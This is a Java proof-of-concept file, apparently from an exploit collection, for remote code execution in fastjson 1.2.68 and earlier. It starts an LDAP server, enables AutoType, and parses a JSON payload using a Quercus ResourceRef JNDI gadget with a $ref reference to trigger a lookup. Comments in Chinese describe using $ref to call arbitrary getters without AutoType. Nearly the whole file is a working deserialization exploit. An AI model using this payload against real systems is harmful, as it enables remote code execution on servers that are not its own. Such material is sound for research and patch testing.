package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;
import org.springframework.security.web.savedrequest.DefaultSavedRequest;

/**
 * todo 发现新的Fastjson利用面，通过$ref引用功能，可以任意触发大部分getter方法，理论可以通过此种方式RCE，还能在不开启AutoType的情况下，任意调用大部分当前反序列化对象的getter方法，若存在危险method，就能进行攻击
 *
 * fastjson <= 1.2.68 RCE，需要开启AutoType
 *
 *
 * quercus ResourceRef jndi gadget
 *
 * <dependency>
 *       <groupId>com.caucho</groupId>
 *       <artifactId>quercus</artifactId>
 *       <version>4.0.63</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class QuercusPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\", \"value\": {\"$ref\":\"$.value\"}}";//ldap方式
    JSON.parse(payload);
  }
}
